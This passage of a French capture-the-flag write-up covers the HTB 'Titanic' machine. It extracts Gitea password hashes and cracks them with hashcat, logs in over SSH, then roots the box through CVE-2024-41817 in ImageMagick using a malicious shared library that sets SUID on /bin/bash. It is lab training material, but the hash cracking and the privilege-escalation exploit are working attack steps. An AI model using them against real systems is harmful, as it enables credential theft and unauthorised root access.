+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">sqlite3&lt;/span> &lt;span class="nx">gitea&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">db&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="k">select&lt;/span> &lt;span class="nx">salt&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">passwd&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">gitea2hashcat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Run&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">output&lt;/span> &lt;span class="nx">hashes&lt;/span> &lt;span class="nx">through&lt;/span> &lt;span class="nx">hashcat&lt;/span> &lt;span class="nx">mode&lt;/span> &lt;span class="mi">10900&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">PBKDF2&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">HMAC&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">SHA256&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sha256&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">50000&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">LRSeX70bIM8x2z48aij8mw&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">y6IMz5J9OtBWe2gWFzLT&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="nx">oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY&lt;/span>&lt;span class="p">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sha256&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">50000&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">PjRSt4VE&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">L7pQA1pNtNA&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="nx">THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">F2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="nx">wvxaCYZJjRE6llM&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">hashcat&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="mi">10900&lt;/span> &lt;span class="nx">hash&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wordlists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rockyou&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sha256&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">50000&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">PjRSt4VE&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">L7pQA1pNtNA&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="nx">THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">F2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="nx">wvxaCYZJjRE6llM&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">=:&lt;/span>&lt;span class="mi">25282528&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>On l&amp;rsquo;utilise pour se connecter via SSH à la machine.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">3
+&lt;/span>&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">5
+&lt;/span>&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">gitea&lt;/span> &lt;span class="nx">mysql&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">e85d89a008cff72094f40882eb2f7d9b&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;h2 id="root">Root
+&lt;/h2>&lt;h3 id="cve-2024-41817imagemagick">CVE-2024-41817(ImageMagick)
+&lt;/h3>&lt;p>Une fois connecté en SSH, on remarque le script &lt;code>identify_images.sh&lt;/code> dans le dossier &lt;code>/opt/scripts/&lt;/code>.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">24
+&lt;/span>&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">opt&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">tree&lt;/span> &lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">├──&lt;/span> &lt;span class="nx">app&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">│&lt;/span>   &lt;span class="err">├──&lt;/span> &lt;span class="nx">app&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">│&lt;/span>   &lt;span class="err">├──&lt;/span> &lt;span class="nx">static&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">├──&lt;/span> &lt;span class="nx">assets&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">└──&lt;/span> &lt;span class="nx">images&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">├──&lt;/span> &lt;span class="nx">entertainment&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">jpg&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">├──&lt;/span> &lt;span class="nx">exquisite&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">dining&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">jpg&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">├──&lt;/span> &lt;span class="nx">favicon&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ico&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">├──&lt;/span> &lt;span class="nx">home&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">jpg&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">├──&lt;/span> &lt;span class="nx">luxury&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">cabins&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">jpg&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">└──&lt;/span> &lt;span class="nx">metadata&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">└──&lt;/span> &lt;span class="nx">styles&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">css&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">│&lt;/span>   &lt;span class="err">├──&lt;/span> &lt;span class="nx">templates&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">│&lt;/span>   &lt;span class="err">│&lt;/span>   &lt;span class="err">└──&lt;/span> &lt;span class="nx">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">html&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">│&lt;/span>   &lt;span class="err">└──&lt;/span> &lt;span class="nx">tickets&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">├──&lt;/span> &lt;span class="nx">containerd&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="kt">error&lt;/span> &lt;span class="nx">opening&lt;/span> &lt;span class="nx">dir&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">└──&lt;/span> &lt;span class="nx">scripts&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">└──&lt;/span> &lt;span class="nx">identify_images&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">8&lt;/span> &lt;span class="nx">directories&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">10&lt;/span> &lt;span class="nx">files&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">opt&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">scripts&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">identify_images&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cd&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">opt&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">app&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">static&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">assets&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">images&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">truncate&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="nx">metadata&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">find&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">opt&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">app&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">static&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">assets&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">images&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="kd">type&lt;/span> &lt;span class="nx">f&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="s">&amp;#34;*.jpg&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nx">xargs&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">magick&lt;/span> &lt;span class="nx">identify&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="nx">metadata&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+Cette commande va identifier le format et caractéristiques des fichiers finissant par &lt;code>.jpg&lt;/code> dans &lt;code>/opt/app/static/assets/images/&lt;/code> et les stocker dans &lt;code>/opt/app/static/assets/metadata.log&lt;/code>.&lt;br>
+On remarque que le timestamp de metadata.log est actualisé chaque minute, le script appartient à root donc susceptible d&amp;rsquo;être lancé par une tâche cron.&lt;br>
+Les commandes &lt;code>truncate&lt;/code>, &lt;code>find&lt;/code>, &lt;code>xargs&lt;/code> ne sont pas exploitables ici. &lt;code>Imagemagick&lt;/code> étant un outil utilisé dans des CTF dans ses versions vulnérables, on cherche des CVE associées à sa version, la &lt;code>7.1.1-35&lt;/code>.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">magick&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">version&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Version&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">ImageMagick&lt;/span> &lt;span class="mf">7.1.1&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">35&lt;/span> &lt;span class="nx">Q16&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">HDRI&lt;/span> &lt;span class="nx">x86_64&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="nx">bfce2a62&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">20240713&lt;/span> &lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//imagemagick.org&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>On trouve &lt;a class="link" href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8" target="_blank" rel="noopener"
+>cet advisory sur Github&lt;/a> concernant la &lt;code>CVE-2024-41817&lt;/code> permettant une execution de code arbitraire sur les versions &amp;lt;= à 7.1.1-35.&lt;br>
+Pour obtenir de l&amp;rsquo;éxécution de code en tant que root, on va adapter le POC mentionné en modifiant id pour set le SUID sur /bin/bash.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">11
+&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">12
+&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">13
+&lt;/span>&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">15
+&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">16
+&lt;/span>&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tmp&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">libxcb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="nx">include&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">stdio&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="nx">include&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">stdlib&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="nx">include&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">unistd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">__attribute__&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">constructor&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="nx">void&lt;/span> &lt;span class="nf">init&lt;/span>&lt;span class="p">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;chmod +s /bin/bash&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tmp&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">gcc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">x&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">shared&lt;/span> &lt;span class="nx">libxcb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">fPIC&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">o&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">libxcb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">so&lt;/span>&lt;span class="mf">.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tmp&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">mv&lt;/span> &lt;span class="nx">libxcb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">so&lt;/span>&lt;span class="mf">.1&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">opt&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">app&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">static&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">assets&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">images&lt;/span>&lt;span class="o">/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tmp&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">ld&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">rwsr&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">sr&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">x&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="nx">root&lt;/span> &lt;span class="nx">root&lt;/span> &lt;span class="mi">1396520&lt;/span> &lt;span class="nx">Mar&lt;/span> &lt;span class="mi">14&lt;/span> &lt;span class="mi">2024&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tmp&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">bash&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">bash&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">5.1&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">id&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">1000&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">developer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">1000&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">developer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">euid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">egid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">groups&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1000&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">developer&lt;/span>&lt;span class="p">)&lt;/span>
